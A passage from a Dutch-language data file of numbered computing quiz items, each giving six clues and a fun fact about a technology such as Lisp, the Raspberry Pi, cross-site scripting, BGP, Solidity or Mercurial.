      'Het bracht cookies, JavaScript en SSL naar het web.',
      'De broncode werd in 1998 vrijgegeven en werd het Mozilla-project.',
      'De dominante browser van midden jaren 90, met een scheepsroer in het logo.'
    ],
    funFact: "Mozilla, de naam die erna voortleefde, was de interne codenaam van de browser: 'Mosaic killer'."
  },
  116: {
    clues: [
      'John McCarthy beschreef het in 1958 aan MIT.',
      'Twee basisfuncties zijn genoemd naar delen van een machinewoord van de IBM 704.',
      "Code en data hebben dezelfde vorm, wat krachtige macro's mogelijk maakt.",
      "Programma's bestaan uit S-expressies.",
      'Emacs en AutoCAD hebben allebei een dialect ervan ingebouwd.',
      'De LISt Processing-taal, beroemd om zijn haakjes.'
    ],
    funFact: 'Garbage collection werd rond 1959 door John McCarthy voor deze taal uitgevonden.'
  },
  117: {
    clues: [
      'Een foundation in Cambridge, Engeland, lanceerde het in 2012 om kinderen te laten programmeren.',
      'Eben Upton leidde het project.',
      'Het eerste model kostte 35 dollar en was zo groot als een creditcard.',
      'Met de GPIO-pinnen sluit je lampjes, sensoren en motoren aan.',
      'Het bedrijf ging in 2024 naar de beurs in Londen.',
      'De piepkleine computer op één printplaat, genoemd naar een vrucht en een Griekse letter.'
    ],
    funFact: 'De Pi in de naam komt van Python, de taal die het moest leren.'
  },
  118: {
    clues: [
      'John McCarthy vond het rond 1959 uit voor Lisp.',
      'Mark-and-sweep en reference counting zijn twee klassieke aanpakken.',
      'Generationele versies leunen op de observatie dat de meeste objecten jong sterven.',
      "De 'stop-the-world'-pauzes kunnen de latency laten pieken.",
      'Java, Go, C# en JavaScript gebruiken het; C en Rust niet.',
      'Geheugen dat niet meer gebruikt wordt automatisch vrijmaken.'
    ],
    funFact: 'In 2020 herschreef Discord een service van Go naar Rust, deels om de latencypieken kwijt te raken die dit elke twee minuten veroorzaakte.'
  },
  119: {
    clues: [
      'Het groeide in 2011 uit een chatstartup die Envolve heette.',
      'Het eerste product was een realtime database die JSON naar elke client synchroniseerde.',
      'Google kocht het in 2014.',
      'De documentdatabase Firestore, authenticatie en hosting worden vaak samen gebruikt.',
      'Mobiele en webapps hoeven er geen eigen backend voor te schrijven.',
      'Het app-ontwikkelplatform van Google, met vuur en een basis in de naam.'
    ],
    funFact: 'De oprichters zagen dat ontwikkelaars hun chatdienst gebruikten om andere appdata te synchroniseren, en maakten daar een product van.'
  },
  120: {
    clues: [
      'Beveiligingsengineers van Microsoft bedachten de volledige naam rond 2000.',
      'De afkorting gebruikt een X om verwarring met stylesheets te voorkomen.',
      'In 2005 gebruikte de Samy-worm het om in minder dan een dag een miljoen vrienden te maken op MySpace.',
      'Het gebeurt als gebruikersinvoer zonder escaping als HTML wordt weergegeven.',
      'Een Content Security Policy maakt het veel moeilijker.',
      'Cross-site scripting.'
    ],
    funFact: "De Samy-worm zette de regel 'but most of all, samy is my hero' op elk besmet MySpace-profiel."
  },
  121: {
    clues: [
      'Een groep bedrijven, waaronder Intel, bracht de eerste versie uit in 1996.',
      'Ajay Bhatt van Intel wordt vaak de mede-uitvinder genoemd.',
      'De klassieke rechthoekige stekker moet je beroemd genoeg drie keer proberen.',
      'De omkeerbare Type-C-connector kwam in 2014.',
      'Sinds eind 2024 eist de EU dat nieuwe telefoons ermee opladen.',
      'De Universal Serial Bus.'
    ],
    funFact: 'Een bekende grap zegt dat de oude rechthoekige stekker drie kanten heeft: fout, nog steeds fout, en goed.'
  },
  122: {
    clues: [
      'Edsger Dijkstra illustreerde het met filosofen die vorken delen aan een tafel.',
      'Edward Coffman noemde er in 1971 vier voorwaarden voor.',
      'Thread A houdt een lock vast en wacht op die van B, terwijl B op die van A wacht.',
      'Locks altijd in dezelfde volgorde nemen voorkomt het.',
      'Databases detecteren het en breken een van de transacties af.',
      'Wanneer twee processen eeuwig op elkaar wachten.'
    ],
    funFact: 'Dijkstra gaf het probleem van de dinerende filosofen eerst als tentamenvraag aan zijn studenten.'
  },
  123: {
    clues: [
      'Richard Stallman schreef het in 1986 voor het GNU-project.',
      'Het kan een core dump openen om te zien waar een programma crashte.',
      "Commando's als break, run, next, step en bt zijn de basis.",
      "Het heeft een tekstinterface, en veel IDE's sturen het achter de schermen aan.",
      'Het debugt C, C++, Rust, Go en meer.',
      'De GNU Debugger.'
    ],
    funFact: "Met 'bt' print je een backtrace: de keten van functieaanroepen die tot het huidige punt leidde."
  },
  124: {
    clues: [
      'Silicon Graphics bracht het in 1992 uit, gebaseerd op zijn eigen IRIS GL.',
      'Het werkt als één grote toestandsmachine.',
      'Oude code tekende driehoeken tussen aanroepen van glBegin en glEnd.',
      'De shaders worden in GLSL geschreven, en de Khronos Group onderhoudt het.',
      'Apple verklaarde het in 2018 verouderd, en Vulkan is de low-level opvolger.',
      "De cross-platform graphics-API met een naam die met 'Open' begint."
    ],
    funFact: "Games als Quake hielpen het eind jaren 90 populair te maken op pc's."
  },
  125: {
    clues: [
      'Jarred Sumner bracht het in 2022 uit.',
      'Het is geschreven in Zig.',
      'Het gebruikt JavaScriptCore, de engine van Safari, in plaats van V8.',
      'Het is een runtime, bundler, testrunner en pakketbeheerder in één binary.',
      'Het wil een directe vervanger zijn voor Node.js, alleen sneller.',
      'De JavaScript-runtime met de Engelse naam van een broodje.'
    ],
    funFact: 'Het logo is een broodje met een gezichtje.'
  },
  126: {
    clues: [
      'Yandex ontwikkelde het voor zijn webanalysedienst en maakte het in 2016 open source.',
      'Het slaat data op per kolom, niet per rij.',
      'Het kan miljarden rijen per seconde aggregeren.',
      'In 2021 werd het een zelfstandig bedrijf.',
      'Het is een populaire keuze voor realtime analyses.',
      'De kolomgeoriënteerde database met een naam van een muisactie en een gebouw.'
    ],
    funFact: "De naam komt van 'clickstream' en 'data warehouse'."
  },
  127: {
    clues: [
      'Wes McKinney begon eraan in 2008, toen hij bij een hedgefonds werkte.',
      "De naam komt van 'panel data', een term uit de econometrie.",
      'Het centrale object is het DataFrame.',
      'read_csv, groupby en merge zijn enkele van de meestgebruikte functies.',
      'Het wordt bijna altijd geïmporteerd als pd.',
      'De Python-library voor data-analyse met de naam van zwart-witte beren.'
    ],
    funFact: "De naam komt van 'panel data' en speelt ook met 'Python data analysis'."
  },
  128: {
    clues: [
      'Mark Crispin ontwierp het in 1986 aan Stanford.',
      'Anders dan de oudere concurrent houdt het berichten op de server.',
      'Het synchroniseert mappen en gelezen-status over al je apparaten.',
      'Het gebruikt poort 143, of 993 als het versleuteld is.',
      'Mailapps gebruiken het om te lezen, terwijl SMTP wordt gebruikt om te versturen.',
      'Het Internet Message Access Protocol.'
    ],
    funFact: 'De oudere concurrent, POP3, downloadt berichten en verwijdert ze meestal van de server, daarom werkt dat slecht met meer dan één apparaat.'
  },
  129: {
    clues: [
      'Dan Abramov schreef het in 2015 om time-travel debugging te demonstreren in een talk.',
      'Het leende ideeën van Flux en van de Elm-architectuur.',
      'Alle state zit in één store en verandert alleen via verstuurde actions.',
      'Pure functies die reducers heten, berekenen de volgende state.',
      'De officiële Toolkit maakte een eind aan veel van de beruchte boilerplate.',
      'De voorspelbare statecontainer die vaak met React wordt gebruikt, met een naam die reducer en Flux mengt.'
    ],
    funFact: "Het werd voor het eerst getoond op React Europe 2015, in de talk 'Hot Reloading with Time Travel' van Dan Abramov."
  },
  130: {
    clues: [
      'Het werd in 2014 een W3C-aanbeveling en staat nu in de Fetch-standaard.',
      'Het is een gecontroleerde manier om de same-origin policy van de browser te versoepelen.',
      "Voor sommige requests stuurt de browser eerst een OPTIONS-'preflight'.",
      'De server antwoordt met headers zoals Access-Control-Allow-Origin.',
      'De foutmelding in de console heeft talloze frontendontwikkelaars in verwarring gebracht.',
      'Cross-Origin Resource Sharing.'
    ],
    funFact: 'De browser dwingt het af, niet de server: hetzelfde request vanuit curl werkt prima, en daarom voelen de fouten zo raadselachtig.'
  },
  131: {
    clues: [
      'Drie ontwikkelaars in Kopenhagen begonnen ermee, en het werd in 2005 gelanceerd op WWDC van Apple.',
      'In het begin draaide het alleen op de Mac.',
      'Games worden erin gescript met C#.',
      'Een plan uit 2023 om per game-installatie te rekenen zorgde voor ophef en werd later geschrapt.',
      'Pokémon Go, Hollow Knight en Among Us zijn ermee gebouwd.',
      'De game-engine met een Engelse naam die eenheid betekent.'
    ],
    funFact: 'Voordat de oprichters zich op de engine richtten, maakten ze er een game mee die GooBall heette.'
  },
  132: {
    clues: [
      'Borland bracht het in 1995 uit, met Anders Hejlsberg als hoofdarchitect.',
      'De naam werd gekozen omdat het met databases zoals Oracle moest praten.',
      'Het gebruikt Object Pascal en een componentenbibliotheek die de VCL heet.',
      'Je bouwde Windows-apps door componenten op een formulier te slepen, razendsnel.',
      'Het wordt nog steeds verkocht door Embarcadero.',
      'De tool voor snelle applicatieontwikkeling, genoemd naar de Griekse stad van het orakel.'
    ],
    funFact: 'De naam komt van het gezegde dat je naar Delphi gaat als je met het Orakel wilt praten.'
  },
  133: {
    clues: [
      'Miško Hevery, die ook AngularJS maakte, begon eraan bij Builder.io.',
      "In plaats van hydration zet het in op 'resumability'.",
      'Een dollarteken aan het eind van een functienaam markeert een grens voor lazy loading.',
      'Het wil bijna geen JavaScript laden tot de gebruiker iets doet.',
      'Componenten gebruiken JSX maar zijn geen React.',
      'Het webframework met een naam die een verbastering is van het Engelse woord voor snel.'
    ],
    funFact: 'Het serialiseert de state van de applicatie in de HTML, zodat de browser verdergaat waar de server stopte in plaats van opnieuw te beginnen.'
  },
  134: {
    clues: [
      'Het groeide begin jaren 70 bij Bell Labs uit een taal die B heette.',
      'In 1973 werd er een besturingssysteem in herschreven, wat toen ongebruikelijk was.',
      'Een boek van Kernighan en Ritchie uit 1978 was tien jaar lang de onofficiële specificatie.',
      'Pointers, handmatig geheugenbeheer met malloc en free, en headerbestanden die op .h eindigen.',
      'De meeste kernels van besturingssystemen, ook Linux, zijn er nog steeds in geschreven.',
      'De systeemprogrammeertaal van Dennis Ritchie, met een naam van één letter.'
    ],
    funFact: "De traditie van een eerste programma dat 'hello, world' print, werd populair door het boek van Kernighan en Ritchie over deze taal."
  },
  135: {
    clues: [
      'Google publiceerde de broncode in september 2008.',
      'De rendering-engine, Blink, werd in 2013 afgesplitst van WebKit.',
      'Microsoft Edge, Brave, Opera en Vivaldi zijn er allemaal op gebouwd.',
      'Electron-apps leveren er een kopie van mee.',
      'Het is het opensourceproject achter de browser van Google.',
      'De opensourcebrowser genoemd naar een glanzend metallisch element.'
    ],
    funFact: 'Toen Microsoft Edge er in 2020 op herbouwde, werd het de engine achter de grote meerderheid van desktopbrowsers.'
  },
  136: {
    clues: [
      'IBM maakte het in 2001 open source.',
      'Sinds 2004 wordt het beheerd door een onafhankelijke foundation.',
      'De naam werd vaak gezien als een steek naar Sun Microsystems.',
      'Bijna alles is er een plug-in, en jarenlang had elke jaarlijkse release een eigen naam, zoals Kepler of Luna.',
      'Tien jaar lang was het de standaard-IDE voor Java-ontwikkelaars.',
      'De Java-IDE genoemd naar het moment dat de maan de zon bedekt.'
    ],
    funFact:
      'Van Galileo in 2009 tot Photon in 2018 volgden de namen van de jaarlijkse releases het alfabet: Helios, Indigo, Juno, Kepler, Luna, Mars, Neon, Oxygen.'
  },
  137: {
    clues: [
      'Netscape introduceerde het in 1994 voor zijn Navigator-browser.',
      'Het draait het belangrijkste webprotocol over TLS, oorspronkelijk SSL.',
      'De standaardpoort is 443.',
      "Let's Encrypt, gelanceerd in 2015, maakte de benodigde certificaten gratis.",
      "Sinds 2018 markeert Chrome sites zonder als 'Niet beveiligd'.",
      'De beveiligde versie van HTTP, te herkennen aan het slotje.'
    ],
    funFact: "Let's Encrypt maakte de certificaten gratis en automatisch, en inmiddels gebruikt de grote meerderheid van alle paginabezoeken het."
  },
  138: {
    clues: [
      'Andreas Rumpf begon er in 2008 aan onder een langere naam.',
      'In 2014 kreeg het een kortere naam van drie letters.',
      'De syntax lijkt op Python, met betekenisvolle inspringing.',
      'Het compileert naar C, C++ of JavaScript.',
      "Het heeft krachtige macro's en een garbage collector die je kunt verwisselen.",
      'De taal die dezelfde naam heeft als een spel met lucifers.'
    ],
    funFact: 'Het heette eerst Nimrod, naar de bijbelse jager, voordat in 2014 de kortere naam werd gekozen.'
  },
  139: {
    clues: [
      'Het eerste product, App Engine, verscheen in 2008 als preview.',
      'Het biedt Spanner, een database die atoomklokken gebruikt om het over de tijd eens te worden.',
      'Het datawarehouse, BigQuery, doorzoekt terabytes in seconden.',
      'De beheerde Kubernetes-dienst komt van het bedrijf dat Kubernetes bedacht.',
      'Het is de derde van de grote drie publieke clouds.',
      'Het cloudplatform van de zoekgigant.'
    ],
    funFact: 'Spanner houdt data wereldwijd consistent met TrueTime, een API met GPS-ontvangers en atoomklokken in de datacenters.'
  },
  140: {
    clues: [
      'Mark Anders en Scott Guthrie bouwden het eerste prototype in 1997.',
      'Het verving Classic ASP, de Active Server Pages van Microsoft.',
      'Web Forms, MVC en Razor Pages zijn drie van de programmeermodellen.',
      'De cross-platform herschrijving kwam in 2016, met de webserver Kestrel.',
      'Stack Overflow is een van de bekendste sites die erop draait.',
      'Het webframework van Microsoft voor .NET.'
    ],
    funFact: 'Scott Guthrie, een van de makers, ging later de clouddivisie van Microsoft leiden.'
  },
  141: {
    clues: [
      'Ken Thompson en Dennis Ritchie begonnen eraan bij Bell Labs in 1969, op een PDP-7.',
      'De naam was een woordgrap op Multics, een groter project waar Bell Labs uit was gestapt.',
      "De filosofie: schrijf programma's die één ding goed doen en samenwerken.",
      'Pipes, toegevoegd in 1973, maken de uitvoer van het ene programma de invoer van het volgende.',
      "Linux, macOS en de BSD's volgen allemaal het ontwerp.",
      'Het besturingssysteem van Bell Labs waarvan de naam vaak in hoofdletters wordt geschreven.'
    ],
    funFact: 'De tijd wordt geteld in seconden sinds 1 januari 1970, de zogeheten epoch.'
  },
  142: {
    clues: [
      'OASIS publiceerde de eerste versie in 2002, en versie 2.0 in 2005.',
      'Het geeft ondertekende XML-assertions door van een identity provider aan een service provider.',
      'Bugs in het controleren van XML-handtekeningen maken het een geliefd doelwit van beveiligingsonderzoekers.',
      'Het regelt single sign-on in veel grote bedrijven.',
      "Veel SaaS-producten bieden het alleen in hun duurste abonnement, de zogeheten 'SSO-tax'.",
      'De Security Assertion Markup Language.'
    ],
    funFact: 'Een website die sso.tax heet, houdt bij welke softwareleveranciers veel meer vragen voor abonnementen met single sign-on.'
  },
  143: {
    clues: [
      'Ken Thompson schreef het in 1973, naar verluidt in één nacht.',
      'De naam komt van een commando in de editor ed: g/re/p.',
      'Opties als -i, -r, -v en -n zijn het dagelijks brood.',
      'Tools als ack en ripgrep werden gebouwd als snellere alternatieven.',
      'De naam werd een werkwoord voor het doorzoeken van tekst.',
      'Het Unix-commando dat regels print die op een patroon lijken.'
    ],
    funFact: 'De naam spelt een commando uit ed: globally search for a regular expression and print de passende regels.'
  },
  144: {
    clues: [
      'De eerste versie werd in 1989 op twee servetten geschetst tijdens een IETF-bijeenkomst.',
      'Het wisselt routes uit tussen autonome systemen.',
      'Elk netwerk kondigt aan welke IP-reeksen het kan bereiken.',
      'In 2008 maakte een foute aankondiging uit Pakistan YouTube wereldwijd onbereikbaar.',
      'In oktober 2021 haalde een fout ermee Facebook, Instagram en WhatsApp urenlang offline.',
      'Het Border Gateway Protocol, de lijm die routes op het internet bij elkaar houdt.'
    ],
    funFact: "De bijnaam is het 'two-napkin protocol', omdat Kirk Lougheed en Yakov Rekhter het tijdens de lunch op servetten schetsten."
  },
  145: {
    clues: [
      'Google Brain maakte het in november 2015 open source.',
      'Het volgde een intern Google-systeem op dat DistBelief heette.',
      "Google ontwierp eigen chips, TPU's, om het sneller te draaien.",
      'Keras werd de officiële high-level API.',
      'Jarenlang was het het populairste deep-learningframework.',
      'De machine-learninglibrary van Google, genoemd naar multidimensionale arrays die door een graaf stromen.'
    ],
    funFact: 'De naam beschrijft hoe het werkt: tensors, multidimensionale arrays, stromen door een graaf van bewerkingen.'
  },
  146: {
    clues: [
      'Miško Hevery en Adam Abrons begonnen er in 2009 aan, en al snel werd het een Google-project.',
      'Het maakte two-way data binding mainstream.',
      'Controllers praatten met de view via een speciaal object dat $scope heette.',
      'Attributen als ng-app, ng-model en ng-repeat maakten van gewone HTML een app.',
      'De langetermijnondersteuning stopte officieel op 31 december 2021.',
      'De eerste versie van het framework van Google, voordat de herschrijving de twee letters aan het eind liet vallen.'
    ],
    funFact: "Hevery zou er een Google-project van 17.000 regels in ongeveer drie weken mee hebben herschreven, en eindigde met zo'n 1.500 regels."
  },
  147: {
    clues: [
      "Tot 2010 stond het bekend onder de naam van een Lisp-dialect met 'PLT' ervoor.",
      'De eerste regel is #lang, omdat het gemaakt is om nieuwe talen te bouwen.',
      'Het wordt geleverd met een beginnersvriendelijke IDE waarvan de naam met Dr begint.',
      'Het leerboek How to Design Programs gebruikt het.',
      'Het is een afstammeling van Scheme van een groep universitaire onderzoekers.',
      'De Lisp met een Engelse naam die ook herrie of tennisracket betekent.'
    ],
    funFact: 'Het #lang-systeem is zo flexibel dat er Datalog, Algol 60 en zelfs een getypeerde versie van de taal zelf bovenop gebouwd zijn.'
  },
  148: {
    clues: [
      'Abhinav Asthana begon eraan in 2012 als zijproject in India.',
      'Het begon als Chrome-extensie.',
      'Requests worden gegroepeerd in collections, met variabelen per omgeving.',
      'De commandline-tegenhanger om collections te draaien heet Newman.',
      "Het is een van de populairste tools om API's uit te proberen.",
      'De API-client met de Engelse naam van iemand die je post bezorgt.'
    ],
    funFact: 'In 2021 was het zijproject uitgegroeid tot een bedrijf met een waarde van 5,6 miljard dollar.'
  },
  149: {
    clues: [
      'Het werd in 2014 voorgesteld door Gavin Wood.',
      'De code compileert naar bytecode voor een virtuele machine die voor elke stap gas rekent.',
      "Programma's beginnen met het keyword contract in plaats van class.",
      'Een reentrancy-bug in een programma in deze taal leidde in 2016 tot een blockchain die in tweeën splitste.',
      'Het is de hoofdtaal voor smart contracts op Ethereum.',
      'De Ethereum-taal met een Engelse naam die stevigheid of betrouwbaarheid betekent.'
    ],
    funFact:
      'Nadat The DAO in 2016 was leeggehaald, draaide Ethereum de diefstal terug met een hard fork; de oorspronkelijke chain leeft door als Ethereum Classic.'
  },
  150: {
    clues: [
      'Matt Mackall begon eraan in april 2005, een paar weken na Git.',
      'Het ontstond om dezelfde reden als Git: de Linux-kernel verloor zijn gratis BitKeeper-licentie.',
      'Het is grotendeels in Python geschreven.',
      'Het commando is het scheikundige symbool voor kwik.',
      'Facebook en Mozilla gebruikten het jarenlang.',
      'Het gedistribueerde versiebeheersysteem met een Engelse naam die wispelturig betekent.'
    ],
    funFact: 'Het commando, hg, is het scheikundige symbool van kwik, het vloeibare metaal achter de naam.'
  },
  151: {
    clues: [
      'Alain Colmerauer en Philippe Roussel maakten het in 1972 in Marseille.',
      "Programma's zijn feiten en regels, en je voert ze uit door vragen te stellen.",
      'Het vindt antwoorden met unificatie en backtracking.',
      'Het Japanse Fifth Generation Computer-project in de jaren 80 zette erop in.',
      'De bekendste taal voor logisch programmeren.',
      "De naam is kort voor 'programmation en logique'."
    ],
    funFact: 'IBM Watson, dat in 2011 de quiz Jeopardy! won, gebruikte het om de structuur van vragen te analyseren.'
  },
  152: {
    clues: [
      'Het begon als tool met de naam Fig van een klein bedrijf dat Orchard heette.',
      'Docker kocht dat bedrijf in 2014.',
      'Je beschrijft services, netwerken en volumes in één YAML-bestand.',
      'De tweede versie werd in Go herschreven als plug-in voor de hoofd-CLI.',
      "Eén 'up'-commando start je app, je database en je cache tegelijk.",
      'De tool om applicaties met meerdere containers te definiëren in een compose.yaml-bestand.'
    ],
    funFact: "Het commando veranderde van docker-compose met een streepje naar 'docker compose' met een spatie, toen het een CLI-plug-in werd."
  },
  153: {
    clues: [
      'Het begon in 1989 als gezamenlijk product van Microsoft, Sybase en Ashton-Tate.',
      'De eerste versie draaide op OS/2.',
      'Het SQL-dialect heet Transact-SQL, of T-SQL.',
      'De beheertool staat bekend als SSMS.',
      'Sinds 2017 draait het ook op Linux.',
      'De relationele database van Microsoft.'
    ],
    funFact: 'Dat Microsoft het in 2016 voor Linux aankondigde, werd gezien als teken van hoe veel het bedrijf veranderd was.'
  },
  154: {
    clues: [
      'Het kwam van Ryan Florence en Michael Jackson, de auteurs van een populaire React-routinglibrary.',
      'Bij de lancering had je een betaalde licentie nodig, tot het in 2021 open source werd.',
      'Elke route exporteert een loader om data te lezen en een action om formulieren af te handelen.',
      'Shopify kocht het bedrijf erachter in 2022.',
      'De features werden later samengevoegd in React Router versie 7.',
      'Het full-stack React-framework met een naam die een nieuwe versie van een nummer betekent.'
    ],
    funFact: 'Door de focus op webstandaarden werkten veel features zelfs met JavaScript uitgeschakeld, dankzij gewone HTML-formulieren.'
  },
  155: {
    clues: [
      'Het werd aangekondigd op re:Invent in 2014.',
      "Het maakte 'serverless' tot een modewoord.",
      'Je uploadt een functie, en die draait alleen als een event hem aanroept.',
      'Elke run duurt maximaal 15 minuten, en cold starts zijn het bekendste nadeel.',
      'Het draait op Firecracker, een microVM-techniek die de maker in 2018 open source maakte.',
      'De function-as-a-service van Amazon, genoemd naar een Griekse letter.'
    ],
    funFact: 'De facturering is zo fijnmazig dat je per milliseconde draaitijd betaalt.'
  },
  156: {
    clues: [
      'Matt Holt bracht het in 2015 uit.',
      'Het is in Go geschreven en wordt geleverd als één binary.',
      'Het was de eerste webserver die automatisch en standaard HTTPS gebruikte.',
      "Het haalt en vernieuwt zelf certificaten bij Let's Encrypt.",
      'Het simpele configuratiebestand is naar de server zelf genoemd.',
      'De webserver met de Engelse naam van iemand die de golftas van een golfer draagt.'
    ],
    funFact: 'Een complete configuratie om een site via HTTPS te serveren kan één regel zijn, met alleen de domeinnaam.'
  },
  157: {
    clues: [
      'Stephen Kleene beschreef de onderliggende theorie in de jaren 50.',
      'Ken Thompson bouwde het in de editors QED en ed, en grep groeide daaruit.',
      "Eén slecht geschreven exemplaar legde in 2019 het netwerk van Cloudflare zo'n half uur plat.",
      'Tekens als ^, $, * en \\d zijn het alfabet.',
      "'Sommige mensen denken bij een probleem: ik gebruik er gewoon een. Nu hebben ze twee problemen.'",
      'Kort voor reguliere expressie.'
    ],
    funFact: "De bekende grap over 'twee problemen' wordt meestal toegeschreven aan Jamie Zawinski, uit 1997."
  },
  158: {
    clues: [
      'Google bracht het in 2021 uit als opvolger van het Polymer-project.',
      'Het is een kleine library om standaard webcomponents te bouwen.',
      'Templates worden geschreven als tagged template literals met html``.',
      'Reactieve properties renderen alleen de delen van het template die veranderd zijn opnieuw.',
      'Het weegt ongeveer 5 kB.',
      'De library voor webcomponents met een Engelse naam van drie letters die ook verlicht betekent.'
    ],
    funFact: 'Omdat de componenten standaard custom elements zijn, kun je ze in elk framework gebruiken, of zonder.'
  },
  159: {
    clues: [
      'Clark Evans, Ingy döt Net en Oren Ben-Kiki stelden het in 2001 voor.',
      'De naam stond eerst voor Yet Another Markup Language en werd daarna een recursieve grap.',
      'Inspringing is belangrijk, en lijsten beginnen met een streepje.',
      'In de oudere versie wordt een NO zonder aanhalingstekens, voor Noorwegen, false.',
      'Kubernetes-manifesten en GitHub-workflows worden erin geschreven.',
      "Het dataformaat met een naam die 'Ain't Markup Language' betekent."
    ],
    funFact: "Het 'Noorwegenprobleem': in versie 1.1 wordt de landcode NO gelezen als de boolean false, tenzij je hem tussen aanhalingstekens zet."
  },
  160: {
    clues: [
      'Het begon in 2012 als afstudeerproject aan een universiteit.',
      'Het belooft in de praktijk geen runtime-exceptions.',
      'De compiler is beroemd om vriendelijke, behulpzame foutmeldingen.',
      'Het patroon met model, update en view inspireerde Redux.',
      'Een puur functionele taal die naar JavaScript compileert voor webfrontends.',
      'De taal van Evan Czaplicki, met de Engelse naam van een iep.'
    ],
    funFact: 'Dan Abramov noemde de architectuur van deze taal als een van de inspiratiebronnen voor Redux.'
  },
  161: {
    clues: [
      'Het verving een ouder framework dat Sapper heette.',
      'Versie 1.0 kwam uit in december 2022.',
      'Routes zijn mappen met bestanden die een plusteken hebben, zoals +page en +layout.',
      'Adapters zetten dezelfde app op Node, Vercel, Netlify of Cloudflare.',
      'Het is gebouwd op Vite en wordt geleid door Rich Harris.',
      'Het applicatieframework voor Svelte, genoemd als een gereedschapskist.'
    ],
    funFact: 'Rich Harris, de maker ervan en van Svelte, maakte interactieve graphics bij The New York Times voordat hij bij Vercel ging werken.'
  },
  162: {
    clues: [
      'Het begon in 2011 bij een Argentijns softwarebedrijf.',
      'De eerste compiler was in Ruby geschreven, tot het zichzelf in 2013 kon compileren.',
      'Het leidt types af, dus het ziet er dynamisch uit maar wordt tijdens het compileren gecontroleerd.',
      'Het compileert via LLVM naar native code en gebruikt fibers voor concurrency.',
      "De slogan was 'fast as C, slick as Ruby'.",
      'De gecompileerde taal met Ruby-achtige syntax, genoemd naar een helder mineraal.'
    ],
    funFact: 'De compiler is sinds 2013 in de taal zelf geschreven, toen die de oorspronkelijke Ruby-versie verving.'
  },
  163: {
    clues: [
      'Judd Vinet begon eraan in 2002, geïnspireerd door een distributie die CRUX heette.',
      'Het is een rolling release: er zijn geen grote versie-upgrades.',
      'De pakketbeheerder heet pacman.',
      'De gebruikersrepository, de AUR, en de wiki zijn legendarisch.',
      "Het leverde de meme 'I use ___, btw' op.",
      'De doe-het-zelf-Linux-distributie met een blauwe driehoek als logo.'
    ],
    funFact: 'De wiki is zo grondig dat gebruikers van veel andere distributies er ook op leunen.'
  },
  164: {
    clues: [
      'Dave Winer, Don Box en anderen bij Microsoft ontwierpen het in 1998.',
      'Elk bericht zit in een XML-envelop met een header en een body.',
      'Services worden beschreven in WSDL-bestanden.',
      'Er groeide een hele familie WS-*-standaarden omheen.',
      "REST heeft het voor web-API's grotendeels vervangen.",
      'Het XML-berichtenprotocol met de Engelse naam van zeep.'
    ],
    funFact: 'De naam stond ooit voor Simple Object Access Protocol, maar versie 1.2 liet de afkorting vallen; velen grapten dat het toch nooit simpel was.'
  },
  165: {
    clues: [
      'Het groeide rond 2006 uit experimenten van Mozilla die Canvas 3D heetten.',
      'De Khronos Group bracht versie 1.0 uit in 2011.',
      'Het is gebaseerd op OpenGL ES, de mobiele variant van een klassieke graphics-API.',
      'Je krijgt het door getContext aan te roepen op een canvas-element.',
      'three.js en de meeste 3D op het web draaien erop.',
      'De browser-API voor 3D-graphics met hardwareversnelling.'
    ],
    funFact: "De opvolger, WebGPU, is gemodelleerd naar moderne API's zoals Vulkan, Metal en Direct3D 12."
  },
  166: {
    clues: [
      'Caleb Porzio bracht het in 2019 uit.',
      "Het is bedoeld om interactiviteit te strooien over pagina's die op de server zijn gerenderd.",
      'Je voegt gedrag toe met attributen zoals x-data, x-show en x-on:click.',
      'Het heeft geen buildstap nodig: één scripttag en je bent klaar.',
      'Het is de A in de TALL-stack, naast Tailwind, Laravel en Livewire.',
      'Het piepkleine JavaScript-framework genoemd naar bergen.'
    ],
    funFact: 'De maker bouwde ook Livewire, en de twee worden vaak samen gebruikt in Laravel-projecten.'
  },
  167: {
    clues: [
      'Hans Peter Luhn beschreef het idee in 1953 in een interne memo bij IBM.',
      'Het maakt van een sleutel een index met een functie.',
      'Twee sleutels in dezelfde bucket heet een botsing.',
      'Opzoeken kost gemiddeld constante tijd.',
      'De dict van Python en de Map van JavaScript zijn erop gebouwd.',
      'De datastructuur die sleutels via een hashfunctie aan waarden koppelt.'
    ],
    funFact: 'Hans Peter Luhn bedacht ook het Luhn-algoritme, dat creditcardnummers nog steeds op typefouten controleert.'
  },
  168: {
    clues: [
      'Don Ho bracht het in 2003 uit.',
      'Het is gebouwd op de editorcomponent Scintilla en draait alleen op Windows.',
      'Het logo is een kameleon.',
      'De auteur geeft releases soms namen met een politieke boodschap.',
      'Het is de favoriete gratis upgrade van de ingebouwde teksteditor van Windows.',
      'De teksteditor voor Windows die twee plustekens aan Notepad toevoegt.'
    ],
    funFact: 'De auteur gebruikte releasenamen om politiek stelling te nemen, wat af en toe leidde tot aanvallen op de site.'
  },
  169: {
    clues: [
      'Eric Brewer presenteerde het in 2000 als vermoeden in een keynote.',
      'Seth Gilbert en Nancy Lynch bewezen het in 2002.',
      'Het zegt dat je tijdens een netwerkpartitie moet kiezen tussen twee garanties.',
      'Die garanties zijn consistentie en beschikbaarheid.',
      "Het wordt vaak samengevat als 'kies er twee uit drie'.",
      'De stelling over consistency, availability en partition tolerance.'
    ],
    funFact: "Brewer schreef later zelf dat 'kies er twee uit drie' misleidend is, omdat partities zeldzaam zijn en de afweging subtieler is."
  },
  170: {
    clues: [
      'Netscape maakte de eerste versie in 1999 voor zijn portal My Netscape.',
      'Aaron Swartz hielp een van de versies schrijven toen hij pas 14 was.',
      'De bekendste uitleg van de naam is Really Simple Syndication.',
      'Google Reader, een populaire app ervoor, werd in 2013 opgeheven.',
      'Podcasts worden er tot op vandaag mee verspreid.',
      'Het feedformaat voor het web met een oranje icoon.'
    ],
    funFact: 'Elke podcastapp vindt nieuwe afleveringen nog steeds door een feed in dit formaat te lezen.'
  },
  171: {
    clues: [
      'De ideeën komen van Reactive Extensions, rond 2009 bij Microsoft gemaakt door het team van Erik Meijer.',
      'Het kerntype is de Observable, een stroom waarden door de tijd.',
      'Operators als map, filter en switchMap worden aan elkaar geregen met pipe().',
      "De operators worden vaak uitgelegd met 'marble diagrams'.",
      'De HTTP-client en formulieren van Angular leunen er zwaar op.',
      'De JavaScript-library voor reactief programmeren met observables.'
    ],
    funFact: 'De vijfde versie was een complete herschrijving onder leiding van Ben Lesh, die toen bij Netflix werkte.'
  },
  172: {
    clues: [
      'Het begon met Intels 8086-processor in 1978.',
      'Het is beroemd omdat het decennialang achterwaarts compatibel bleef.',
      'Het is een CISC-architectuur met instructies van verschillende lengte.',
      'De 64-bitsuitbreiding werd ontworpen door AMD, en Intel nam die over.',
